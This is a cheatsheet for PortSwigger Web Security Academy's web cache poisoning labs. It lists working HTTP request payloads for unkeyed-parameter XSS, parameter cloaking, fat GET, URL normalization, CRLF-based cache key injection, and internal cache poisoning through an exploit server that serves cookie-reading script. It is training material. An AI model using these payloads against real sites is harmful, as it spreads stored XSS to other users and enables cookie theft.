# 🧪 Web Cache Poisoning (Implementation Flaws) Cheatsheet

Complete exploitation methodologies, cache key manipulation techniques, and payload construction for Cache Implementation Flaw labs in PortSwigger Web Security Academy.

> **Tip:** I strongly recommend using the **Param Miner** Burp Suite extension to automate the discovery of unkeyed headers, query parameters, and fat GET request bodies. It saves a massive amount of time during cache analysis.

---

## 📌 Core Mechanisms & Identification

* **Keyed Components:** Elements used by the cache to identify a unique resource (e.g., Request-Line, `Host` header).
* **Unkeyed Components:** Request parameters or headers ignored by the cache engine when building the cache key, but processed by the back-end application.
* **Cache Implementation Flaws:** Discrepancies between how the front-end cache parses cache keys versus how the back-end application processes input parameters.

---

## 🛠️ Detailed Breakdown & Payloads

### 1. Unkeyed Parameters & Parameter Parsing

**Web cache poisoning via an unkeyed query string**
The cache excludes the entire query string from the cache key, but the back-end uses dynamic parameters (e.g., `Origin` or custom query strings) to serve content:

```http
GET /?script='/><script>alert(1)</script> HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Origin: cachebuster
```

**Web cache poisoning via an unkeyed query parameter**
Specific parameters (like analytics `utm_content` or `utm_campaign`) are excluded from the cache key, allowing attackers to inject malicious resources while serving from the cached home page:

```http
GET /?utm_content='/><script>alert(1)</script> HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**Parameter cloaking**
Exploit differences in how the cache and back-end parse parameter delimiters (e.g., using `;` or duplicate parameter names) to cloak malicious parameters from the cache key:

```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

---

### 2. Request Body & Normalization Attacks

**Web cache poisoning via a fat GET request**
The front-end cache ignores the HTTP body for `GET` requests when creating the cache key, but the back-end processes the payload inside the request body:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 17

callback=alert(1)
```

**URL normalization**
The front-end cache normalizes encoded paths (e.g., decoding `%2f` or resolving `/..`), while the back-end receives the raw URL, leading to reflected XSS executing inside normalized cache keys:

```http
GET /random/<script>alert(1)</script> HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```
*Or targeting 404 error responses:*
```http
GET /%2e%2e/admin HTTP/1.1
```

---

### 3. Key Injections & Internal Caches

**Cache key injection**
unkeyed query parameter
+
parameter cloaking
+
CRLF injection
+
cache key injection

```http
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$

GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
```

**Internal cache poisoning**
The application uses two caching layers (e.g., front-end CDN + back-end internal framework cache). Attackers target unkeyed inputs that only affect the internal cache, causing persistent poisoning across edge nodes:

```http
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```
*Exploit on exploit server:*

File=/resources/geolocate.js >
Body=alert(document.cookie)


---
